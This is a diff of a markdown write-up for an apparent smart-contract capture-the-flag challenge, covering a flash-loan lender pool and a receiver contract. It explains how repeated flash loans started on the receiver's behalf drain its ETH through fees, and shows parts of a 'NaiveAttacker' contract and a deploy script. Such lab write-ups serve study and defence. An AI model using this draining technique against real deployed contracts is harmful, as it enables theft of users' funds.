@@ -31,6 +31,10 @@ Receiver should check if its ETH balance has increase after `_executeActionDurin
 
 There is a risk of `pool` doing a reentrancy attack on the receiver. Although if `pool` is trusted, this check might be omitted.
 
+## Issues in NaiveReceiverLenderPool
+
+### 1. Anyone can initiate flashloan for `borrower`
+
 ## Solution
 
 The secret to solving this is in issue #2. We can initiate 10 flash loans, and each time receiver will pay 1 ETH as fee, thus completely draining the receiver contract at the end.
@@ -60,10 +64,12 @@ contract NaiveAttacker {
             INaiveReceiverLenderPool(_lender).flashLoan(_receiver, 0);
     }
 }
+```
 
+```ts
 // Test script
 const AttackerFactory = await ethers.getContractFactory("NaiveAttacker");
-    await AttackerFactory.deploy(this.pool.address, this.receiver.address);
+await AttackerFactory.deploy(this.pool.address, this.receiver.address);
 ```
 
 ## Probable Fix
